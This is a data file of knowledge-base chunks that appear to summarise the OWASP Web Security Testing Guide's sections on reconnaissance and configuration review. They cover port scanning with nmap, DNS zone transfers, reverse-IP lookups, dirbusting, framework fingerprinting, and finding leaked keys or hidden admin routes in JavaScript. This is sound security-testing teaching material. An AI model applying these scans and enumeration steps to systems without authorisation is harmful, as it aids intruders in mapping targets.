{"id": "kb-000246", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "An example of a humans.txt file from Google describes that the website is built by a diverse team and provides a link to their careers page, highlighting the human aspect behind the technology."}
{"id": "kb-000247", "section": null, "tags": ["CONF", "INFO"], "source": "wstg-v4.2.pdf", "text": "Other RFCs and Internet drafts suggest standardized uses of files within the .well-known/ directory, providing additional standardized information sources for web developers and testers. Web application discovery is crucial for identifying hosted applications on a web server, as many have known vulnerabilities. Misconfiguration and lack of updates are common issues for applications perceived as 'internal', leading to potential security risks."}
{"id": "kb-000248", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The traditional 1:1 relationship between an IP address and a web server is diminishing due to the rise of virtual servers, resulting in multiple applications sharing the same IP."}
{"id": "kb-000249", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "In testing scenarios where only IP addresses are provided, web applications may not be discovered if they do not respond directly at that address, as they may be associated with different DNS names."}
{"id": "kb-000250", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Incomplete information about symbolic names can lead to oversight in large organizations, potentially missing unadvertised or non-obvious web applications."}
{"id": "kb-000251", "section": null, "tags": ["INFO"], "source": "wstg-v4.2.pdf", "text": "Techniques for web application discovery include DNS searches, reverse IP searches, and utilizing search engines for uncovering accessible applications. The goal of testing should be comprehensive, identifying all applications rather than just those known or explicitly listed."}
{"id": "kb-000252", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "There are three factors influencing how many applications are related to a given DNS name or IP address: different base URLs, non-standard ports, and virtual hosts."}
{"id": "kb-000253", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Different Base URL: A web application can be located at different URLs under the same domain, such as http://www.example.com/url1, http://www.example.com/url2, and http://www.example.com/url3. These applications may not have a page associated with the root URL, making them 'hidden' unless the user knows the exact path."}
{"id": "kb-000254", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Non-standard Ports: Web applications are typically associated with standard ports like 80 (HTTP) and 443 (HTTPS), but they can also operate on arbitrary TCP ports, which can be accessed by specifying the port number in the URL, e.g., http://www.example.com:20000/."}
{"id": "kb-000255", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Virtual Hosts: A single IP address can serve multiple symbolic names (DNS names), like www.example.com, helpdesk.example.com, and webmail.example.com. Different content can be served under different names using virtual hosts, which are specified in the HTTP 1.1 Host header."}
{"id": "kb-000256", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "To identify non-standard-named web applications, testers can use techniques like checking for misconfigured web servers that allow directory browsing or using search engine operators (e.g., site: www.example.com) to find indexed but hidden URLs."}
{"id": "kb-000257", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testers can also probe potential non-published URLs, applying dictionary-style searches or 'intelligent guessing' based on common patterns for web applications, such as webmail or administrative interfaces."}
{"id": "kb-000258", "section": null, "tags": ["API", "HTTP"], "source": "wstg-v4.2.pdf", "text": "A port scanner such as nmap can perform service recognition using the -sV option, identifying HTTP and HTTPS services on non-standard ports. To perform a full TCP port scan, nmap can be run with the command: nmap –Pn –sT –sV –p0-65535 192.168.1.100, which scans all 64k TCP ports. The output of nmap shows interesting ports and their states, including which services and versions are running on those ports."}
{"id": "kb-000259", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An example output from nmap might indicate an Apache HTTP server running on port 80 and an HTTPS server on port 443, which should be confirmed through further probing or web access. Port 901 is noted to have a Samba SWAT administration server, and port 1241 is identified as the SSL-wrapped Nessus security scanner."}
{"id": "kb-000260", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Using telnet to connect to ports can confirm the type of service running. For example, sending an HTTP GET request to an unspecified port revealed that it was running an HTTP server with the response HTTP/1.0 200 OK."}
{"id": "kb-000261", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Important technical terms include: 1. Port Scanner - a tool for identifying open ports on a network, 2. Service Recognition - the process of determining the services available on those ports."}
{"id": "kb-000262", "section": null, "tags": ["CONF", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Vulnerability scanners such as Nessus can identify HTTP[S] services running on non-standard ports, provided they are configured to scan all ports. Nessus is capable of performing tests on known web server vulnerabilities and the SSL configuration of HTTPS services."}
{"id": "kb-000263", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testers can identify DNS names associated with an IP address using various techniques, including DNS Zone Transfers, although this method is becoming less effective due to security practices."}
{"id": "kb-000264", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "To conduct a DNS Zone Transfer, testers must determine the name servers serving the target IP address, which can be done using tools like nslookup, host, or dig. An example of querying a name server to identify DNS entries is provided, showing the command `host -t ns www.owasp.org` and its output."}
{"id": "kb-000265", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "If testers have a symbolic name for the IP address they are assessing, they can query the name server for the associated domain to potentially gather more DNS information."}
{"id": "kb-000266", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "In the example command to request a zone transfer (`host -l www.owasp.org ns1.secure.net`), the tester may encounter a refusal response indicating that the zone transfer is not allowed."}
{"id": "kb-000267", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Another technique for identifying domain names is DNS Inverse Queries, which use PTR records instead of requesting a zone transfer for the IP address. Web-based DNS searches can also be utilized for discovering associated symbolic names for given IP addresses. Web-based services can facilitate DNS lookups, akin to a DNS zone transfer, allowing testers to perform name-based searches on domains."}
{"id": "kb-000268", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "An example of such a service is the Netcraft Search DNS service, which helps testers identify names belonging to a specified domain, such as example.com."}
{"id": "kb-000269", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Reverse-IP services allow testers to query web applications for inverse DNS-related information, differing from traditional DNS queries by using web platforms instead of name servers."}
{"id": "kb-000270", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The effectiveness of reverse-IP services is improved by using multiple of these services due to their tendency to return varied and partial results."}
{"id": "kb-000271", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Examples of reverse-IP services include Domain Tools Reverse IP and popular search engines like Bing, which use specific syntax for queries (e.g., ip:x.x.x.x)."}
{"id": "kb-000272", "section": null, "tags": ["INFO"], "source": "wstg-v4.2.pdf", "text": "The importance of using search engines for additional information gathering is highlighted; it can refine testing and reveal more symbolic names or applications via non-obvious URLs."}
{"id": "kb-000273", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Illustrating this, a query for www.owasp.org can also lead a tester to additional domains like webgoat.org and webscarab.com through search engines' results."}
{"id": "kb-000274", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Recommended tools for DNS lookups include nslookup and dig; search engines like Google and Bing are useful for information that aligns with reverse-IP searches."}
{"id": "kb-000275", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Programmers often include detailed comments and metadata in source code, which can sometimes reveal sensitive internal information that might be exploited by attackers; this necessitates a review to check for potential information leakage."}
{"id": "kb-000276", "section": null, "tags": ["API", "CLIENT"], "source": "wstg-v4.2.pdf", "text": "Common front-end technologies such as ReactJS, AngularJS, and Vue frequently use client-side JavaScript. Sensitive information like Private API Keys, internal IP addresses, and sensitive routes can be hardcoded in JavaScript, thus necessitating a review to prevent leaks that could aid attackers."}
{"id": "kb-000277", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Performance optimization techniques (e.g., SASS, SCSS, webpack) may complicate front-end code, leading to the deployment of source map files to aid debugging. However, if these files are present in production, they can provide attackers with a clearer path to vulnerabilities."}
{"id": "kb-000278", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "A source map connects a minified JavaScript or CSS file to its original version, making the code easier to read and understand, potentially facilitating the search for vulnerabilities or sensitive information by attackers."}
{"id": "kb-000279", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Testing objectives include reviewing webpage comments and metadata for leaks, gathering and analyzing JavaScript files for information leakage, and identifying the presence of source map or debug files in production environments."}
{"id": "kb-000280", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "HTML comments, which developers sometimes forget in production environments, should be tested for sensitive information. Testers should specifically look for comments starting with <!-- that could inadvertently disclose SQL code, usernames, passwords, or internal addresses."}
{"id": "kb-000281", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "The tester may find sensitive information such as database administrator passwords hardcoded in comments, highlighting the importance of thorough security testing."}
{"id": "kb-000282", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "HTML version information can provide context for security vulnerabilities, and different Document Type Definitions (DTDs) can be specified using the <!DOCTYPE> declaration, such as strict.dtd and loose.dtd."}
{"id": "kb-000283", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "META tags in HTML can be leveraged for categorization and search engine optimization. For example, the <META name=\"keywords\"> tag improves search results, while the <META name=\"robots\"> tag informs web crawlers about indexing preferences."}
{"id": "kb-000284", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "The Platform for Internet Content Selection (PICS) and the Protocol for Web Description Resources (POWDER) are standards for associating metadata with online content, indicating that metadata can play an essential role in content management."}
{"id": "kb-000285", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "JavaScript code can also contain sensitive data, which is why testers should review the source code within <script> tags and check any external JavaScript files linked via the src attribute."}
{"id": "kb-000286", "section": null, "tags": ["API", "AUTHN", "CLIENT"], "source": "wstg-v4.2.pdf", "text": "Check JavaScript code for sensitive information leaks such as API keys, internal IP addresses, sensitive routes, or credentials. Example: 'const myS3Credentials = { accessKeyId: config('AWSS3AccessKeyID'), secretAcccessKey: config('AWSS3SecretAccessKey'), };'"}
{"id": "kb-000287", "section": null, "tags": ["API", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Check API Key restrictions—testers should verify if the restrictions are set per service or by IP, HTTP referrer, application, or SDK. For instance, with a Google Map API key, if it's restricted only by the Google Map APIs, attackers may misuse it for other unrestricted APIs, leading to unauthorized charges."}
{"id": "kb-000288", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Inspect JavaScript code for sensitive routes, which may indicate links to internal or hidden admin pages, such as: '\"ADMIN_PAGE\":\"/hidden_administrator\"'."}
{"id": "kb-000289", "section": null, "tags": ["CLIENT", "UPLOAD"], "source": "wstg-v4.2.pdf", "text": "Identifying Source Map Files: Source map files are usually loaded when DevTools are opened or can be found by adding the '.map' extension to JavaScript file names (e.g., /static/js/main.chunk.js.map)."}
{"id": "kb-000290", "section": null, "tags": ["API", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Black-Box Testing involves checking source map files for sensitive information that may provide attackers with insights about the application. For example, a source map file might reveal original source file paths like '/home/sysadmin/cashsystem/src/actions/index.js'. Enumerating the application and its attack surface is essential for identifying areas of weakness before thorough testing can commence. Test objective: Identify possible entry and injection points through request and response analysis. Testers should understand the application and user interaction with it before testing begins. Important focus: Analyze all HTTP requests, parameters, and form fields passed to the application. Key methods: Understand when to use GET versus POST requests and the implications of using other RESTful methods."}
{"id": "kb-000291", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "Utilizing tools like intercepting proxy helps testers monitor all requests and responses, especially for POST requests where parameters are in the body. Hidden form fields may contain sensitive data that testers should take note of as they can become attack vectors. Documenting interesting parameters in a spreadsheet helps track each request's characteristics for future analysis."}
{"id": "kb-000292", "section": null, "tags": ["API", "AUTHN"], "source": "wstg-v4.2.pdf", "text": "Points of interest include types of requests (GET, POST, etc.), authentication status, usage of TLS, and the presence of WebSockets in requests."}
{"id": "kb-000293", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Identify all parameters in POST requests, focusing on hidden parameters that may not be visible unless using specific tools like a proxy or viewing HTML source."}
{"id": "kb-000294", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "In POST requests, all form fields including hidden parameters are sent in the body of the HTTP request, which can affect the subsequent page shown and access level based on their values."}
{"id": "kb-000295", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "For GET requests, identify parameters found in the URL's query string. Query strings often appear in key-value pairs (e.g., foo=bar) and may be separated by characters like &, ~, or : ."}
{"id": "kb-000296", "section": null, "tags": ["CRYPTO", "SESSION"], "source": "wstg-v4.2.pdf", "text": "When analyzing multiple parameters in a single string or POST request, it is important to identify all parameters—even if they are encoded or encrypted—as certain ones may be necessary for executing tests or attacks. Track where new cookies are set, modified, or added, as indicated by the Set-Cookie header."}
{"id": "kb-000297", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Identify redirects (3xx HTTP status codes), especially 403 Forbidden and 500 Internal Server Errors, that may occur during normal responses to requests."}
{"id": "kb-000298", "section": null, "tags": ["API", "CONF", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Observe interesting HTTP headers, such as 'Server: BIG-IP', which may indicate load balancing and potential misconfiguration on individual servers. Example of a GET request for an online shopping application shows key parameters such as CUSTOMERID, ITEM, PRICE, and IP."}
{"id": "kb-000299", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Example of a POST request for logging into an application demonstrates parameters passed in the body, illustrating the importance of recognizing session cookies and custom headers."}
{"id": "kb-000300", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Gray-box methodology in web application testing combines black-box and white-box testing approaches. It includes understanding how external data sources interact with the application, necessitating communication with developers to comprehend input expectations and formats."}
{"id": "kb-000301", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The OWASP Attack Surface Detector (ASD) is a tool that analyzes source code to discover web application endpoints, the parameters they accept, and their data types. It can find unlinked or unused parameters that automated tools may miss."}
{"id": "kb-000302", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "ASD can track changes in an application’s attack surface across different versions, making it useful for ensuring security throughout the development lifecycle."}
{"id": "kb-000303", "section": null, "tags": ["API", "HTTP"], "source": "wstg-v4.2.pdf", "text": "ASD is available as a plugin for ZAP and Burp Suite as well as a command-line interface (CLI). Its CLI version can output results in JSON format, which can be useful when source code access is restricted."}
{"id": "kb-000304", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Command execution example for ASD: java -jar attack-surface-detector-cli-1.3.5.jar <source-code-path>. For instance, running 'java -jar attack-surface-detector-cli-1.3.5.jar railsgoat/' initiates endpoint detection against the RailsGoat application, showing various GET and POST endpoints with associated parameters and file references. Example endpoint analysis output shows parameters by request type, including data types and locations in source files."}
{"id": "kb-000305", "section": null, "tags": ["AUTHN", "HTTP"], "source": "wstg-v4.2.pdf", "text": "The output indicates specific parameters for endpoints such as /login and /sessions, highlighting the relevance of different input types and their potential security implications."}
{"id": "kb-000306", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "Understanding the structure of an application is essential for thorough security testing, as it allows for a comprehensive mapping of workflows and potential vulnerabilities."}
{"id": "kb-000307", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "In black-box testing, testers face challenges in accessing the entire codebase which makes exhaustive testing difficult. Documenting discovered code paths is crucial for coverage. Three approaches to measuring code coverage include:"}
{"id": "kb-000308", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "1. **Path Testing**: This involves testing each decision path in the application, including combinatorial and boundary value analysis. While thorough, the number of paths increases exponentially with complexity."}
{"id": "kb-000309", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "2. **Data Flow (Taint Analysis)**: This approach examines how variables are assigned and how data flows through the application, focusing on user interactions."}
{"id": "kb-000310", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "3. **Race Testing**: This tests how multiple concurrent instances of the application interact with the same data, revealing potential race conditions."}
{"id": "kb-000311", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Effective communication with the application owner is vital to determine which areas to focus on during testing. Tools like spreadsheets can help document findings and demonstrate code coverage by listing discovered links and code paths."}
{"id": "kb-000312", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Gray-box and white-box testing approaches simplify the process of ensuring adequate code coverage by leveraging insider knowledge about the application."}
{"id": "kb-000313", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Dynamic Application Security Testing (DAST) tools can automate parts of the coverage process. Examples include tools that use web server agents or third-party agents to monitor coverage specifics."}
{"id": "kb-000314", "section": null, "tags": ["INFO"], "source": "wstg-v4.2.pdf", "text": "Automatic spidering tools, like Zed Attack Proxy (ZAP), are used to discover resources (URLs) on a website. They utilize initial seed URLs to begin the exploration process. Fingerprinting web applications helps identify the frameworks and components used, improving security testing efficiency."}
{"id": "kb-000315", "section": null, "tags": ["HTTP", "INFO", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Common frameworks include WordPress, phpBB, and Mediawiki, often identified through specific markers in HTTP headers, cookies, and directory structures. Automatic tools typically use predefined markers and a database of known signatures to recognize web applications during security tests. The test objective is to fingerprint components used in web applications, primarily through black-box testing. Key locations for fingerprinting include: - **HTTP headers**: The 'X-Powered-By' field can indicate the framework (e.g., 'X-Powered-By: Mono'). - **Cookies**: Specific cookies may denote the framework or application type. - **HTML source code**: Markers in the code can reveal the framework's identity. - **Specific files and folders**: Certain paths might be indicative of particular frameworks. - **File extensions**: Unique extensions may suggest specific technologies in use. - **Error messages**: Responses in error messages can provide clues to the underlying framework."}
{"id": "kb-000316", "section": null, "tags": ["CONF", "HTTP"], "source": "wstg-v4.2.pdf", "text": "The example provided illustrates using the netcat utility to extract an HTTP response and identify the web application framework from the 'X-Powered-By' header, emphasizing that while useful, this method is not foolproof as configurations can hide such information."}
{"id": "kb-000317", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "HTTP headers can leak sensitive information about the server and the frameworks in use, which is critical for penetration testing. For instance, headers like 'X-Powered-By' and 'X-Generator' can reveal the technology stack and versions employed, aiding testers in determining attack vectors."}
{"id": "kb-000318", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An example HTTP response showing potentially sensitive headers is:\nHTTP/1.1 200 OK\nServer: nginx/1.0.14\nX-Powered-By: Blood, sweat and tears\nIn this case, the 'X-Powered-By' header might not align with security best practices if it reveals unnecessary framework version details to users."}
{"id": "kb-000319", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "When the 'X-Powered-By' header shows that a PHP version is used, along with a header like 'X-Generator' indicating frameworks such as Swiftlet, it gives testers explicit insights into the target's configuration. This highlights the importance of detailed header inspection in web security testing."}
{"id": "kb-000320", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Cookies are another method to identify the web framework in use. For example, a cookie named 'CAKEPHP' can indicate that the application is using the CakePHP framework."}
{"id": "kb-000321", "section": null, "tags": ["INFO", "SESSION"], "source": "wstg-v4.2.pdf", "text": "However, while cookies provide reliable signals of the framework, their names can be altered, which reduces their effectiveness as an identification tool. For instance, CakePHP allows session cookie names to be reconfigured according to application needs."}
{"id": "kb-000322", "section": null, "tags": ["CONF", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Changes to the 'X-Powered-By' header are easier to modify compared to session cookie configurations, making the former a more reliable method for identifying web frameworks."}
{"id": "kb-000323", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "HTML source code can contain patterns that provide information about the frameworks being used on a site. Common markers include HTML comments, framework-specific paths (like CSS or JS folders), and script variables."}
{"id": "kb-000324", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Attackers can exploit HTML comments and specific paths found in the source code to determine the types of frameworks and their versions being used, as demonstrated with the ZK framework example."}
{"id": "kb-000325", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Important information about the framework can often be found in the <head> section of the response, in <meta> tags, or hidden within comments at the bottom of the page."}
{"id": "kb-000326", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Dirbusting, also known as forced browsing, is a technique used to identify applications or components by exploiting known file and folder structures on the server. It involves brute forcing a target with a list of common filenames and monitoring HTTP responses to discover server content."}
{"id": "kb-000327", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Dirbusting can reveal valuable information such as default files and specific directories related to the web application, as shown in the example with WordPress where specific folders yielded different HTTP status codes (403 Forbidden, 302 Found, and 200 OK). Dirbusting is a technique used to discover hidden directories or files on web servers, particularly in web applications."}
{"id": "kb-000328", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A CHANGELOG file from a plugin can reveal both the application used (like Drupal) and the version of the plugin, which may contain vulnerabilities."}
{"id": "kb-000329", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "Checking the robots.txt file is advisable before starting dirbusting, as it can provide hints on restricted folders and sensitive information related to the application. Identifying files and folders is crucial during penetration testing as they vary depending on the specific application."}
{"id": "kb-000330", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "For Open Source applications, setting up a temporary installation during penetration tests can provide deeper insights into the infrastructure and functionalities present, including which files may be left on the server. FuzzDB wordlists can be utilized to obtain a comprehensive list of predictable files and folders during web security testing."}
{"id": "kb-000331", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "File extensions in URLs may reveal the underlying web platform or technology used for the application, which is useful for security testing."}
{"id": "kb-000332", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Examples of common web file extensions and their associated technologies include: .php for PHP, .aspx for Microsoft ASP.NET, and .jsp for Java Server Pages."}
{"id": "kb-000333", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Error messages can provide insights into the technology stack used, such as the presence of WordPress indicated by file paths like 'wp-content', and that WordPress is PHP-based, often involving files like 'functions.php'."}
{"id": "kb-000334", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Common identifiers and cookie names associated with various web frameworks and content management systems (CMS) are essential for web security testing. Cookies are important for maintaining sessions and can be targeted by attackers to exploit web applications. Notable cookie names include: 1. Zope: zope3 2. CakePHP: cakephp 3. Kohana: kohanasession 4. Laravel: laravel_session 5. phpBB: phpbb3_ 6. WordPress: wp-settings 7. 1C-Bitrix: BITRIX_ 8. AMPcms: AMP 9. Django CMS: django 10. DotNetNuke: DotNetNukeAnonymous 11. e107: e107_tz 12. EPiServer: EPiTrace, EPiServer 13. Grafitti CMS: grafﬁtibot 14. Hotaru CMS: hotaru_mobile 15. ImpressCMS: ICMSession 16. Indico: MAKACSESSION 17. InstantCMS: InstantCMS[logdate] 18. Kentico CMS: CMSPreferredCulture 19. MODx: SN4[12symb] 20. TYPO3: fe_typo_user 21. Dynamicweb: Dynamicweb 22. LEPTON: lep[some_numeric_value]+sessionid 23. Wix: Domain=.wix.com 24. VIVVO: VivvoSessionId"}
{"id": "kb-000335", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Understanding these identifiers helps security professionals to detect and prevent vulnerabilities related to session management in web applications."}
{"id": "kb-000336", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Web security testing involves recognizing the frameworks and content management systems (CMS) that a web application employs. This is often done by analyzing the HTML source code for specific meta tags that indicate the underlying framework, such as WordPress or Drupal."}
{"id": "kb-000337", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "General markers in web applications, such as '%framework_name%', 'powered by', and 'built upon', can serve as indicators of what technology is being utilized."}
{"id": "kb-000338", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Specific markers include unique identifiers for different platforms, like `<!-- START headerTags.cfm` for Adobe ColdFusion or `__VIEWSTATE` for Microsoft ASP.NET, which can aid in identifying the technology stack being used."}
{"id": "kb-000339", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Remediation efforts in web security should be approached with caution: while changing cookie names and hiding file paths can provide some level of obscurity, such strategies are often inadequate against determined attackers, indicating the need for a more robust security posture rather than reliance on obscurity. Stakeholder awareness and maintenance activities are vital for better security practices beyond superficial measures."}
{"id": "kb-000340", "section": null, "tags": ["CRYPTO", "INFO"], "source": "wstg-v4.2.pdf", "text": "WhatWeb is highlighted as a powerful fingerprinting tool used in web security testing. It is included in default installations of Kali Linux and works using mechanisms like text string matching, regular expressions, Google Hack Database queries, MD5 hashes, and URL recognition to identify technologies in use. HTML tag patterns are important in identifying potential web security vulnerabilities. Wappalyzer is a tool that identifies technologies used on websites by analyzing HTML patterns."}
{"id": "kb-000341", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The tool operates at the browser level using regular expression matching, requiring only the page to be loaded in the browser to function effectively."}
{"id": "kb-000342", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Wappalyzer provides output in the form of icons representing different technologies, making it user-friendly for immediate assessment of web technologies upon page loading. Despite its usefulness, Wappalyzer may sometimes produce false positives, indicating incorrect technologies used on a website."}
{"id": "kb-000343", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "The complexity of interconnected web infrastructure includes numerous web applications, emphasizing the importance of configuration management and review to ensure security."}
{"id": "kb-000344", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A single vulnerability can compromise the security of the entire infrastructure; hence, even minor issues can evolve into significant risks."}
{"id": "kb-000345", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "To secure a web application, an in-depth review of configuration and known security issues is necessary, starting with mapping the network and application architecture. Understanding how different components of an infrastructure interact is crucial for assessing their security implications."}
{"id": "kb-000346", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Application architecture can vary significantly; simple setups may involve a single server, while complex systems like online banking may incorporate multiple servers distributed across different network zones."}
{"id": "kb-000347", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Different servers serve various purposes (e.g., reverse proxy, front-end web server, application server, database server) which may be segregated by firewalls to isolate vulnerabilities."}
{"id": "kb-000348", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Information regarding application architecture can facilitate testing; however, if not readily available, testers must derive it through various methods during penetration testing without any prior knowledge."}
{"id": "kb-000349", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "In blind penetration tests, assumptions about architecture will be made starting from simplicity; information is collected through testing and questioning assumptions to build a more accurate architecture map."}
{"id": "kb-000350", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "For example, probing network configurations for firewalls involves analyzing port responses during network scans, as certain responses indicate whether ports are filtered, directly connected to the Internet, or protected by a firewall."}
{"id": "kb-000351", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "The type of firewall (stateful, access list filter, web application firewall) can be determined through detailed packet analysis and configuration checks."}
{"id": "kb-000352", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Web servers may return different error messages for common web attacks, indicating the presence of a reverse proxy or application-level firewall."}
{"id": "kb-000353", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Detection of reverse proxies can be inferred from the server header and by timing requests to compare first requests with subsequent requests."}
{"id": "kb-000354", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Network load balancers can be detected by analyzing multiple requests to determine if they are going to the same or different web servers based on header information, such as differing Date headers suggesting unsynchronized server clocks. The presence of load balancers may be indicated by unique cookies, such as those prefixed with BIGipServer by F5 BIG-IP."}
{"id": "kb-000355", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Application web servers often generate distinct response headers, including aspects such as additional header values or cookies like JSESSIONID, indicative of J2EE servers."}
{"id": "kb-000356", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Back-end authentication systems like LDAP or databases are more challenging to detect directly; however, highly dynamic content generation suggests a database back end. Sensitive information, such as numeric identifiers in URLs for online shopping applications, can hint at a database backend's presence."}
{"id": "kb-000357", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Blind tests may reveal knowledge of the underlying database only through vulnerabilities like inadequate exception handling or SQL injection susceptibility."}
{"id": "kb-000358", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "The importance of configuration management in web security lies in the intrinsic complexity of interconnected web server infrastructures, which may involve numerous web applications. Even minor vulnerabilities can escalate into severe risks if they affect shared resources within the infrastructure. An in-depth review of configuration and known security issues is crucial to ensure the security of web applications."}
{"id": "kb-000359", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Improperly configured elements such as web servers, back-end databases, and authentication servers can introduce significant risks and new vulnerabilities."}
{"id": "kb-000360", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "An example of a vulnerability is when a web server allows a remote attacker to disclose the application's source code, potentially enabling further attacks on the application or its users."}
{"id": "kb-000361", "section": null, "tags": ["AUTHN", "CONF"], "source": "wstg-v4.2.pdf", "text": "Key steps for testing configuration management include: identifying infrastructure components, reviewing for known vulnerabilities, assessing administrative tools, evaluating authentication systems, and maintaining a list of defined, controlled ports required by the application."}
